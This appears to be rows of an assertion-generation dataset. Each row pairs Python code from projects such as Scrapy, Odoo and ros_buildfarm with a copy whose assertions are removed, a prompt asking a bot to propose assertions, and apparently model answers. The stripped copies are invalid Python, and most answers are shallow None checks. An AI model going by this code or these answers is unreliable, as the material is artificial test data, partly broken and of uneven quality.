144        bb = [queues[i].get(30) for i in range(n_procs)]
145        res = list(zip(aa, bb))
146
147        # Shut down the pool
148        map_result.get(30)
149        pool.close()
150        pool.join()
151
152        # Check that the results are unique
153        if len(set(aa)) != len(aa) or len(set(res)) != len(res):
154            raise AssertionError(""RNG output duplicated across fork():\n%s"" %
155                                 (pprint.pformat(res),))
156
157
158def get_tests(config={}):
159    tests = []
160    tests += [RNGForkTest()]
161    if multiprocessing is not None:
162        tests += [RNGMultiprocessingForkTest()]
163    return tests
164
165if __name__ == '__main__':
166    suite = lambda: unittest.TestSuite(get_tests())
167    unittest.main(defaultTest='suite')
168
169# vim:set ts=4 sw=4 sts=4 expandtab:
170",7598,"[[63, 'sys.platform', '!=', 'win', 'code block does not work on windows system'], [79, 'reseed_count_after', '>', 'reseed_count_before', 'reseed count must increase after reinitializing the RNG'], [107, 'results', '==', 'results_dict.keys()', 'RNG output should not be duplicated across fork'], [111, 'q', '!=', None, 'Queue object is required for task communication'], [129, 'n_procs', '>', 0, 'There should be at least one process'], [143, 'aa', '==', 'n_procs', 'There should be n_procs results'], [147, 'map_result', '!=', None, 'Map result should not be None after closing the pool'], [153, 'aa', '==', 'res', 'RNG output should not be duplicated across fork']]"
eavatar/eavatar-me,"# -*- coding: utf-8 -*-
from __future__ import absolute_import, division, print_function, unicode_literals

import os
from ava.util import time_uuid, base_path, defines, misc


class TestTimeUUID(object):

    def test_uuids_should_be_in_alaphabetical_order(self):
        old = time_uuid.oid()
        for i in range(100):
            t = time_uuid.oid()
            assert t > old
            old = t


def test_base_path_should_contain_pod_folder():

    basedir = base_path()
    source_pod_folder = os.path.join(basedir, defines.POD_FOLDER_NAME)
    assert os.path.exists(source_pod_folder)
    assert os.path.isdir(source_pod_folder)


def test_is_frizon_should_return_false():
    assert not misc.is_frozen()


def test_get_app_dir():

    app_dir = misc.get_app_dir('TestApp')
    assert 'TestApp'.lower() in app_dir.lower()


def test_get_app_dir_via_env():
    os.environ.setdefault('AVA_POD', '/test/folder')
    app_dir = misc.get_app_dir()
    assert app_dir == '/test/folder'
","
1# -*- coding: utf-8 -*-
2from __future__ import absolute_import, division, print_function, unicode_literals
3
4import os
5from ava.util import time_uuid, base_path, defines, misc
6
7
8class TestTimeUUID(object):
9
10    def test_uuids_should_be_in_alaphabetical_order(self):
11        old = time_uuid.oid()
12        for i in range(100):
13            t = time_uuid.oid()
14            old = t
15
16
17def test_base_path_should_contain_pod_folder():
18
19    basedir = base_path()
20    source_pod_folder = os.path.join(basedir, defines.POD_FOLDER_NAME)
21
22
23def test_is_frizon_should_return_false():
24
25
26def test_get_app_dir():
27
28    app_dir = misc.get_app_dir('TestApp')
29
30
31def test_get_app_dir_via_env():
32    os.environ.setdefault('AVA_POD', '/test/folder')
33    app_dir = misc.get_app_dir()
34","[['t', '>', 'old'], ['os.path.exists(source_pod_folder)', '==', 'True'], ['os.path.isdir(source_pod_folder)', '==', 'True'], ['misc.is_frozen()', '==', 'False'], ['app_dir', '==', ""'/test/folder'""]]",6,5,0.8333333333333334,0.005050505050505,"['old', 't', 'basedir', 'source_pod_folder', 'app_dir']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['old', 't', 'basedir', 'source_pod_folder', 'app_dir']
*Code:

1# -*- coding: utf-8 -*-
2from __future__ import absolute_import, division, print_function, unicode_literals
3
4import os
5from ava.util import time_uuid, base_path, defines, misc
6
7
8class TestTimeUUID(object):
9
10    def test_uuids_should_be_in_alaphabetical_order(self):
11        old = time_uuid.oid()
12        for i in range(100):
13            t = time_uuid.oid()
14            old = t
15
16
17def test_base_path_should_contain_pod_folder():
18
19    basedir = base_path()
20    source_pod_folder = os.path.join(basedir, defines.POD_FOLDER_NAME)
21
22
23def test_is_frizon_should_return_false():
24
25
26def test_get_app_dir():
27
28    app_dir = misc.get_app_dir('TestApp')
29
30
31def test_get_app_dir_via_env():
32    os.environ.setdefault('AVA_POD', '/test/folder')
33    app_dir = misc.get_app_dir()
34",2252,"[[11, 'old', '!=', None, ""old shouldn't be None""],
[14, 't', '!=', None, ""time_uuid.oid output shouldn't be None""],
[19, 'basedir', '!=', None, ""base_path output shouldn't be None""],
[20, 'source_pod_folder', '!=', None, ""the join process shouldn't return None""],
[28, 'app_dir', '!=', None, ""app_dir shouldn't be None after execution""],
[33, 'app_dir', '!=', None, ""app_dir shouldn't be None after execution""]]"
chiragjogi/odoo,"# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Business Applications
#    Copyright (c) 2012-TODAY OpenERP S.A. <http://openerp.com>
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from openerp.tests import common


class TestMrpMulticompany(common.TransactionCase):

    def setUp(self):
        super(TestMrpMulticompany, self).setUp()
        cr, uid = self.cr, self.uid

        # Usefull models
        self.ir_model_data = self.registry('ir.model.data')
        self.res_users = self.registry('res.users')
        self.stock_location = self.registry('stock.location')

        group_user_id = self.registry('ir.model.data').xmlid_to_res_id(cr, uid, 'base.group_user')
        group_stock_manager_id = self.registry('ir.model.data').xmlid_to_res_id(cr, uid, 'stock.group_stock_manager')
        company_2_id = self.registry('ir.model.data').xmlid_to_res_id(cr, uid, 'stock.res_company_1')
        self.multicompany_user_id = self.res_users.create(cr, uid,
            {'name': 'multicomp', 'login': 'multicomp',
             'groups_id': [(6, 0, [group_user_id, group_stock_manager_id])],
             'company_id': company_2_id, 'company_ids': [(6,0,[company_2_id])]})


    def test_00_multicompany_user(self):
        """"""check no error on getting default mrp.production values in multicompany setting""""""
        cr, uid, context = self.cr, self.multicompany_user_id, {}
        fields = ['location_src_id', 'location_dest_id']
        defaults = self.stock_location.default_get(cr, uid, ['location_id', 'location_dest_id', 'type'], context)
        for field in fields:
            if defaults.get(field):
                try:
                    self.stock_location.check_access_rule(cr, uid, [defaults[field]], 'read', context)
                except Exception, exc:
                    assert False, ""unreadable location %s: %s"" % (field, exc)
","
1# -*- coding: utf-8 -*-
2##############################################################################
3#
4#    OpenERP, Open Source Business Applications
5#    Copyright (c) 2012-TODAY OpenERP S.A. <http://openerp.com>
6#
7#    This program is free software: you can redistribute it and/or modify
8#    it under the terms of the GNU Affero General Public License as
9#    published by the Free Software Foundation, either version 3 of the
10#    License, or (at your option) any later version.
11#
12#    This program is distributed in the hope that it will be useful,
13#    but WITHOUT ANY WARRANTY; without even the implied warranty of
14#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
15#    GNU Affero General Public License for more details.
16#
17#    You should have received a copy of the GNU Affero General Public License
18#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
19#
20##############################################################################
21
22from openerp.tests import common
23
24
25class TestMrpMulticompany(common.TransactionCase):
26
27    def setUp(self):
28        super(TestMrpMulticompany, self).setUp()
29        cr, uid = self.cr, self.uid
30
31        # Usefull models
32        self.ir_model_data = self.registry('ir.model.data')
33        self.res_users = self.registry('res.users')
34        self.stock_location = self.registry('stock.location')
35
36        group_user_id = self.registry('ir.model.data').xmlid_to_res_id(cr, uid, 'base.group_user')
37        group_stock_manager_id = self.registry('ir.model.data').xmlid_to_res_id(cr, uid, 'stock.group_stock_manager')
38        company_2_id = self.registry('ir.model.data').xmlid_to_res_id(cr, uid, 'stock.res_company_1')
39        self.multicompany_user_id = self.res_users.create(cr, uid,
40            {'name': 'multicomp', 'login': 'multicomp',
41             'groups_id': [(6, 0, [group_user_id, group_stock_manager_id])],
42             'company_id': company_2_id, 'company_ids': [(6,0,[company_2_id])]})
43
44
45    def test_00_multicompany_user(self):
46        """"""check no error on getting default mrp.production values in multicompany setting""""""
47        cr, uid, context = self.cr, self.multicompany_user_id, {}
48        fields = ['location_src_id', 'location_dest_id']
49        defaults = self.stock_location.default_get(cr, uid, ['location_id', 'location_dest_id', 'type'], context)
50        for field in fields:
51            if defaults.get(field):
52                try:
53                    self.stock_location.check_access_rule(cr, uid, [defaults[field]], 'read', context)
54                except Exception, exc:
55","[['False', '==', 'True']]",1,1,1.0,0.000375939849624,"['cr', 'uid', 'self.ir_model_data', 'self.res_users', 'self.stock_location', 'group_user_id', 'group_stock_manager_id', 'company_2_id', 'self.multicompany_user_id', 'context', 'fields', 'defaults']",12,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['cr', 'uid', 'self.ir_model_data', 'self.res_users', 'self.stock_location', 'group_user_id', 'group_stock_manager_id', 'company_2_id', 'self.multicompany_user_id', 'context', 'fields', 'defaults']
*Code:

1# -*- coding: utf-8 -*-
2##############################################################################
3#
4#    OpenERP, Open Source Business Applications
5#    Copyright (c) 2012-TODAY OpenERP S.A. <http://openerp.com>
6#
7#    This program is free software: you can redistribute it and/or modify
8#    it under the terms of the GNU Affero General Public License as
9#    published by the Free Software Foundation, either version 3 of the
10#    License, or (at your option) any later version.
11#
12#    This program is distributed in the hope that it will be useful,
13#    but WITHOUT ANY WARRANTY; without even the implied warranty of
14#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
15#    GNU Affero General Public License for more details.
16#
17#    You should have received a copy of the GNU Affero General Public License
18#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
19#
20##############################################################################
21
22from openerp.tests import common
23
24
25class TestMrpMulticompany(common.TransactionCase):
26
27    def setUp(self):
28        super(TestMrpMulticompany, self).setUp()
29        cr, uid = self.cr, self.uid
30
31        # Usefull models
32        self.ir_model_data = self.registry('ir.model.data')
33        self.res_users = self.registry('res.users')
34        self.stock_location = self.registry('stock.location')
35
36        group_user_id = self.registry('ir.model.data').xmlid_to_res_id(cr, uid, 'base.group_user')
37        group_stock_manager_id = self.registry('ir.model.data').xmlid_to_res_id(cr, uid, 'stock.group_stock_manager')
38        company_2_id = self.registry('ir.model.data').xmlid_to_res_id(cr, uid, 'stock.res_company_1')
39        self.multicompany_user_id = self.res_users.create(cr, uid,
40            {'name': 'multicomp', 'login': 'multicomp',
41             'groups_id': [(6, 0, [group_user_id, group_stock_manager_id])],
42             'company_id': company_2_id, 'company_ids': [(6,0,[company_2_id])]})
43
44
45    def test_00_multicompany_user(self):
46        """"""check no error on getting default mrp.production values in multicompany setting""""""
47        cr, uid, context = self.cr, self.multicompany_user_id, {}
48        fields = ['location_src_id', 'location_dest_id']
49        defaults = self.stock_location.default_get(cr, uid, ['location_id', 'location_dest_id', 'type'], context)
50        for field in fields:
51            if defaults.get(field):
52                try:
53                    self.stock_location.check_access_rule(cr, uid, [defaults[field]], 'read', context)
54                except Exception, exc:
55",4261,"[[27, 'self.cr', '!=', None, ""The cursor should not be None""],
[27, 'self.uid', '!=', None, ""The user id should not be None""],
[32, 'self.ir_model_data', '!=', None, ""The ir_model_data should not be None""],
[33, 'self.res_users', '!=', None, ""The res_users should not be None""],
[34, 'self.stock_location', '!=', None, ""The stock_location should not be None""],
[36, 'group_user_id', '!=', None, ""The group_user_id should not be None""],
[37, 'group_stock_manager_id', '!=', None, ""The stock_manager_id should not be None""],
[38, 'company_2_id', '!=', None, ""The company_2_id should not be None""],
[39, 'self.multicompany_user_id', '!=', None, ""The multicompany_user_id should not be None""],
[47, 'context', '!=', None, ""The context should not be None""],
[49, 'fields', '!=', None, ""The fields should not be None""],
[49, 'defaults', '!=', None, ""The defaults should not be None""]]"
devGregA/code,"""""""
Spider Middleware manager

See documentation in docs/topics/spider-middleware.rst
""""""

from twisted.python.failure import Failure
from scrapy.middleware import MiddlewareManager
from scrapy.utils.defer import mustbe_deferred
from scrapy.utils.conf import build_component_list

def _isiterable(possible_iterator):
    return hasattr(possible_iterator, '__iter__')

class SpiderMiddlewareManager(MiddlewareManager):

    component_name = 'spider middleware'

    @classmethod
    def _get_mwlist_from_settings(cls, settings):
        return build_component_list(settings['SPIDER_MIDDLEWARES_BASE'], \
            settings['SPIDER_MIDDLEWARES'])

    def _add_middleware(self, mw):
        super(SpiderMiddlewareManager, self)._add_middleware(mw)
        if hasattr(mw, 'process_spider_input'):
            self.methods['process_spider_input'].append(mw.process_spider_input)
        if hasattr(mw, 'process_spider_output'):
            self.methods['process_spider_output'].insert(0, mw.process_spider_output)
        if hasattr(mw, 'process_spider_exception'):
            self.methods['process_spider_exception'].insert(0, mw.process_spider_exception)
        if hasattr(mw, 'process_start_requests'):
            self.methods['process_start_requests'].insert(0, mw.process_start_requests)

    def scrape_response(self, scrape_func, response, request, spider):
        fname = lambda f:'%s.%s' % (f.im_self.__class__.__name__, f.im_func.__name__)

        def process_spider_input(response):
            for method in self.methods['process_spider_input']:
                try:
                    result = method(response=response, spider=spider)
                    assert result is None, \
                            'Middleware %s must returns None or ' \
                            'raise an exception, got %s ' \
                            % (fname(method), type(result))
                except:
                    return scrape_func(Failure(), request, spider)
            return scrape_func(response, request, spider)

        def process_spider_exception(_failure):
            exception = _failure.value
            for method in self.methods['process_spider_exception']:
                result = method(response=response, exception=exception, spider=spider)
                assert result is None or _isiterable(result), \
                    'Middleware %s must returns None, or an iterable object, got %s ' % \
                    (fname(method), type(result))
                if result is not None:
                    return result
            return _failure

        def process_spider_output(result):
            for method in self.methods['process_spider_output']:
                result = method(response=response, result=result, spider=spider)
                assert _isiterable(result), \
                    'Middleware %s must returns an iterable object, got %s ' % \
                    (fname(method), type(result))
            return result

        dfd = mustbe_deferred(process_spider_input, response)
        dfd.addErrback(process_spider_exception)
        dfd.addCallback(process_spider_output)
        return dfd

    def process_start_requests(self, start_requests, spider):
        return self._process_chain('process_start_requests', start_requests, spider)
","
1""""""
2Spider Middleware manager
3
4See documentation in docs/topics/spider-middleware.rst
5""""""
6
7from twisted.python.failure import Failure
8from scrapy.middleware import MiddlewareManager
9from scrapy.utils.defer import mustbe_deferred
10from scrapy.utils.conf import build_component_list
11
12def _isiterable(possible_iterator):
13    return hasattr(possible_iterator, '__iter__')
14
15class SpiderMiddlewareManager(MiddlewareManager):
16
17    component_name = 'spider middleware'
18
19    @classmethod
20    def _get_mwlist_from_settings(cls, settings):
21        return build_component_list(settings['SPIDER_MIDDLEWARES_BASE'], \
22            settings['SPIDER_MIDDLEWARES'])
23
24    def _add_middleware(self, mw):
25        super(SpiderMiddlewareManager, self)._add_middleware(mw)
26        if hasattr(mw, 'process_spider_input'):
27            self.methods['process_spider_input'].append(mw.process_spider_input)
28        if hasattr(mw, 'process_spider_output'):
29            self.methods['process_spider_output'].insert(0, mw.process_spider_output)
30        if hasattr(mw, 'process_spider_exception'):
31            self.methods['process_spider_exception'].insert(0, mw.process_spider_exception)
32        if hasattr(mw, 'process_start_requests'):
33            self.methods['process_start_requests'].insert(0, mw.process_start_requests)
34
35    def scrape_response(self, scrape_func, response, request, spider):
36        fname = lambda f:'%s.%s' % (f.im_self.__class__.__name__, f.im_func.__name__)
37
38        def process_spider_input(response):
39            for method in self.methods['process_spider_input']:
40                try:
41                    result = method(response=response, spider=spider)
42                            'Middleware %s must returns None or ' \
43                            'raise an exception, got %s ' \
44                            % (fname(method), type(result))
45                except:
46                    return scrape_func(Failure(), request, spider)
47            return scrape_func(response, request, spider)
48
49        def process_spider_exception(_failure):
50            exception = _failure.value
51            for method in self.methods['process_spider_exception']:
52                result = method(response=response, exception=exception, spider=spider)
53                    'Middleware %s must returns None, or an iterable object, got %s ' % \
54                    (fname(method), type(result))
55                if result is not None:
56                    return result
57            return _failure
58
59        def process_spider_output(result):
60            for method in self.methods['process_spider_output']:
61                result = method(response=response, result=result, spider=spider)
62                    'Middleware %s must returns an iterable object, got %s ' % \
63                    (fname(method), type(result))
64            return result
65
66        dfd = mustbe_deferred(process_spider_input, response)
67        dfd.addErrback(process_spider_exception)
68        dfd.addCallback(process_spider_output)
69        return dfd
70
71    def process_start_requests(self, start_requests, spider):
72        return self._process_chain('process_start_requests', start_requests, spider)
73","[['result', '==', 'None'], ['_isiterable(result)', '==', 'True']]",3,2,0.6666666666666666,0.0006058770069675,"['possible_iterator', 'component_name', 'cls', 'settings', 'mw', 'scrape_func', 'response', 'request', 'spider', 'fname', 'result', '_failure', 'exception', 'dfd', 'start_requests']",15,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['possible_iterator', 'component_name', 'cls', 'settings', 'mw', 'scrape_func', 'response', 'request', 'spider', 'fname', 'result', '_failure', 'exception', 'dfd', 'start_requests']
*Code:

1""""""
2Spider Middleware manager
3
4See documentation in docs/topics/spider-middleware.rst
5""""""
6
7from twisted.python.failure import Failure
8from scrapy.middleware import MiddlewareManager
9from scrapy.utils.defer import mustbe_deferred
10from scrapy.utils.conf import build_component_list
11
12def _isiterable(possible_iterator):
13    return hasattr(possible_iterator, '__iter__')
14
15class SpiderMiddlewareManager(MiddlewareManager):
16
17    component_name = 'spider middleware'
18
19    @classmethod
20    def _get_mwlist_from_settings(cls, settings):
21        return build_component_list(settings['SPIDER_MIDDLEWARES_BASE'], \
22            settings['SPIDER_MIDDLEWARES'])
23
24    def _add_middleware(self, mw):
25        super(SpiderMiddlewareManager, self)._add_middleware(mw)
26        if hasattr(mw, 'process_spider_input'):
27            self.methods['process_spider_input'].append(mw.process_spider_input)
28        if hasattr(mw, 'process_spider_output'):
29            self.methods['process_spider_output'].insert(0, mw.process_spider_output)
30        if hasattr(mw, 'process_spider_exception'):
31            self.methods['process_spider_exception'].insert(0, mw.process_spider_exception)
32        if hasattr(mw, 'process_start_requests'):
33            self.methods['process_start_requests'].insert(0, mw.process_start_requests)
34
35    def scrape_response(self, scrape_func, response, request, spider):
36        fname = lambda f:'%s.%s' % (f.im_self.__class__.__name__, f.im_func.__name__)
37
38        def process_spider_input(response):
39            for method in self.methods['process_spider_input']:
40                try:
41                    result = method(response=response, spider=spider)
42                            'Middleware %s must returns None or ' \
43                            'raise an exception, got %s ' \
44                            % (fname(method), type(result))
45                except:
46                    return scrape_func(Failure(), request, spider)
47            return scrape_func(response, request, spider)
48
49        def process_spider_exception(_failure):
50            exception = _failure.value
51            for method in self.methods['process_spider_exception']:
52                result = method(response=response, exception=exception, spider=spider)
53                    'Middleware %s must returns None, or an iterable object, got %s ' % \
54                    (fname(method), type(result))
55                if result is not None:
56                    return result
57            return _failure
58
59        def process_spider_output(result):
60            for method in self.methods['process_spider_output']:
61                result = method(response=response, result=result, spider=spider)
62                    'Middleware %s must returns an iterable object, got %s ' % \
63                    (fname(method), type(result))
64            return result
65
66        dfd = mustbe_deferred(process_spider_input, response)
67        dfd.addErrback(process_spider_exception)
68        dfd.addCallback(process_spider_output)
69        return dfd
70
71    def process_start_requests(self, start_requests, spider):
72        return self._process_chain('process_start_requests', start_requests, spider)
73",4845,"[[12, 'possible_iterator', '!=', None, ""possible_iterator input to _isiterable function cannot be None""],
[19, 'cls', '!=', None, ""cls input to _get_mwlist_from_settings cannot be None""],
[19, 'settings', '!=', None, ""settings input to _get_mwlist_from_settings cannot be None""],
[24, 'mw', '!=', None, ""_add_middleware function cannot accept None as mw""],
[35, 'scrape_func', '!=', None, ""scrape_func input to scrape_response cannot be None""],
[35, 'response', '!=', None, ""response input to scrape_response cannot be None""],
[35, 'request', '!=', None, ""request input to scrape_response cannot be None""],
[35, 'spider', '!=', None, ""spider input to scrape_response cannot be None""],
[49, '_failure', '!=', None, ""_failure input to process_spider_exception cannot be None""],
[59, 'result', '!=', None, ""result input to process_spider_output cannot be None""]]
"
ros-infrastructure/ros_buildfarm,"# Copyright 2015-2016 Open Source Robotics Foundation, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import subprocess
import sys
from time import sleep


def main(argv=sys.argv[1:]):
    assert len(argv) < 2
    dockerfile = argv[0] if len(argv) == 1 else 'Dockerfile'
    sys.stdout.write(""Get base image name from Dockerfile '%s': "" % dockerfile)
    base_image = get_base_image_from_dockerfile(dockerfile)
    print(base_image)

    known_error_strings = [
        'Error pulling image',
        'Server error: Status 502 while fetching image layer',
    ]
    max_tries = 10
    rc, _ = call_docker_pull_repeatedly(base_image, known_error_strings, max_tries)
    return rc


def get_base_image_from_dockerfile(dockerfile):
    with open(dockerfile, 'r') as h:
        content = h.read()
    lines = content.splitlines()
    from_prefix = 'FROM '
    for line in lines:
        if line.startswith(from_prefix):
            return line[len(from_prefix):]
    assert False, \
        ""Could not find a line starting with '%s' in the Dockerfile '%s'"" % \
        (from_prefix, dockerfile)


def call_docker_pull_repeatedly(base_image, known_error_strings, max_tries):
    for i in range(1, max_tries + 1):
        if i > 1:
            sleep_time = 5 + 2 * i
            print(""Reinvoke 'docker pull' (%d/%d) after sleeping %s seconds"" %
                  (i, max_tries, sleep_time))
            sleep(sleep_time)
        rc, known_error_conditions = call_docker_pull(base_image, known_error_strings)
        if rc == 0 or not known_error_conditions:
            break
        print('')
        print('Invocation failed due to the following known error conditions: '
              ', '.join(known_error_conditions))
        print('')
        # retry in case of failure with known error condition
    return rc, known_error_conditions


def call_docker_pull(base_image, known_error_strings):
    known_error_conditions = []

    cmd = ['docker', 'pull', base_image]
    print('Check docker base image for updates: %s' % ' '.join(cmd))
    proc = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    while True:
        line = proc.stdout.readline()
        if not line:
            break
        line = line.decode()
        sys.stdout.write(line)
        for known_error_string in known_error_strings:
            if known_error_string in line:
                if known_error_string not in known_error_conditions:
                    known_error_conditions.append(known_error_string)
    proc.wait()
    rc = proc.returncode
    return rc, known_error_conditions


if __name__ == '__main__':
    sys.exit(main())
","
1# Copyright 2015-2016 Open Source Robotics Foundation, Inc.
2#
3# Licensed under the Apache License, Version 2.0 (the ""License"");
4# you may not use this file except in compliance with the License.
5# You may obtain a copy of the License at
6#
7#     http://www.apache.org/licenses/LICENSE-2.0
8#
9# Unless required by applicable law or agreed to in writing, software
10# distributed under the License is distributed on an ""AS IS"" BASIS,
11# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
12# See the License for the specific language governing permissions and
13# limitations under the License.
14
15import subprocess
16import sys
17from time import sleep
18
19
20def main(argv=sys.argv[1:]):
21    dockerfile = argv[0] if len(argv) == 1 else 'Dockerfile'
22    sys.stdout.write(""Get base image name from Dockerfile '%s': "" % dockerfile)
23    base_image = get_base_image_from_dockerfile(dockerfile)
24    print(base_image)
25
26    known_error_strings = [
27        'Error pulling image',
28        'Server error: Status 502 while fetching image layer',
29    ]
30    max_tries = 10
31    rc, _ = call_docker_pull_repeatedly(base_image, known_error_strings, max_tries)
32    return rc
33
34
35def get_base_image_from_dockerfile(dockerfile):
36    with open(dockerfile, 'r') as h:
37        content = h.read()
38    lines = content.splitlines()
39    from_prefix = 'FROM '
40    for line in lines:
41        if line.startswith(from_prefix):
42            return line[len(from_prefix):]
43        ""Could not find a line starting with '%s' in the Dockerfile '%s'"" % \
44        (from_prefix, dockerfile)
45
46
47def call_docker_pull_repeatedly(base_image, known_error_strings, max_tries):
48    for i in range(1, max_tries + 1):
49        if i > 1:
50            sleep_time = 5 + 2 * i
51            print(""Reinvoke 'docker pull' (%d/%d) after sleeping %s seconds"" %
52                  (i, max_tries, sleep_time))
53            sleep(sleep_time)
54        rc, known_error_conditions = call_docker_pull(base_image, known_error_strings)
55        if rc == 0 or not known_error_conditions:
56            break
57        print('')
58        print('Invocation failed due to the following known error conditions: '
59              ', '.join(known_error_conditions))
60        print('')
61        # retry in case of failure with known error condition
62    return rc, known_error_conditions
63
64
65def call_docker_pull(base_image, known_error_strings):
66    known_error_conditions = []
67
68    cmd = ['docker', 'pull', base_image]
69    print('Check docker base image for updates: %s' % ' '.join(cmd))
70    proc = subprocess.Popen(
71        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
72    while True:
73        line = proc.stdout.readline()
74        if not line:
75            break
76        line = line.decode()
77        sys.stdout.write(line)
78        for known_error_string in known_error_strings:
79            if known_error_string in line:
80                if known_error_string not in known_error_conditions:
81                    known_error_conditions.append(known_error_string)
82    proc.wait()
83    rc = proc.returncode
84    return rc, known_error_conditions
85
86
87if __name__ == '__main__':
88    sys.exit(main())
89","[['len(argv)', '<', '2'], ['False', '==', 'True']]",2,2,1.0,0.0006345177664974,"['argv', 'dockerfile', 'base_image', 'known_error_strings', 'max_tries', 'rc', '_', 'content', 'lines', 'from_prefix', 'sleep_time', 'known_error_conditions', 'cmd', 'proc', 'line']",15,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['argv', 'dockerfile', 'base_image', 'known_error_strings', 'max_tries', 'rc', '_', 'content', 'lines', 'from_prefix', 'sleep_time', 'known_error_conditions', 'cmd', 'proc', 'line']
*Code:

1# Copyright 2015-2016 Open Source Robotics Foundation, Inc.
2#
3# Licensed under the Apache License, Version 2.0 (the ""License"");
4# you may not use this file except in compliance with the License.
5# You may obtain a copy of the License at
6#
7#     http://www.apache.org/licenses/LICENSE-2.0
8#
9# Unless required by applicable law or agreed to in writing, software
10# distributed under the License is distributed on an ""AS IS"" BASIS,
11# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
12# See the License for the specific language governing permissions and
13# limitations under the License.
14
15import subprocess
16import sys
17from time import sleep
18
19
20def main(argv=sys.argv[1:]):
21    dockerfile = argv[0] if len(argv) == 1 else 'Dockerfile'
22    sys.stdout.write(""Get base image name from Dockerfile '%s': "" % dockerfile)
23    base_image = get_base_image_from_dockerfile(dockerfile)
24    print(base_image)
25
26    known_error_strings = [
